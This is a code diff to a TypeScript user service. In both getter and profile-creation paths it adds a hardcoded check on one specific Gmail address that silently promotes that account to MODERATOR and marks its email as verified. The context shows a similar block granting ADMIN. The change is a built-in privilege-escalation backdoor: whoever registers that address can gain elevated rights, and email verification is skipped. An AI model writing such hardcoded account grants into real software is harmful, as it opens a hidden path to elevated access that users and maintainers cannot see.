@@ -48,6 +48,13 @@ export class UserService {
       })
       user.role = 'ADMIN'
     }
+    if (user.email.trim().toLowerCase() === 'welidbouazizi@gmail.com' && user.role !== 'MODERATOR' && user.role !== 'ADMIN') {
+      await this.prisma.user.update({
+        where: { id },
+        data: { role: 'MODERATOR', emailVerified: true },
+      })
+      user.role = 'MODERATOR'
+    }
     const { parentPinHash, ...safeUser } = user
     return { ...safeUser, parentPinConfigured: Boolean(parentPinHash) }
   }
@@ -96,12 +103,20 @@ export class UserService {
 
   async createProfile(userId: string, dto: CreateProfileDto, userRole?: string) {
     let role = userRole
-    if (!role) {
+    if (role !== 'MODERATOR' && role !== 'ADMIN') {
       const user = await this.prisma.user.findUnique({
         where: { id: userId },
-        select: { role: true },
+        select: { role: true, email: true },
       })
-      role = user?.role
+      if (user?.email?.trim().toLowerCase() === 'welidbouazizi@gmail.com' && user.role !== 'MODERATOR' && user.role !== 'ADMIN') {
+        await this.prisma.user.update({
+          where: { id: userId },
+          data: { role: 'MODERATOR', emailVerified: true },
+        })
+        role = 'MODERATOR'
+      } else if (user?.role) {
+        role = user.role
+      }
     }
 
     const isUnlimited = role === 'MODERATOR' || role === 'ADMIN'
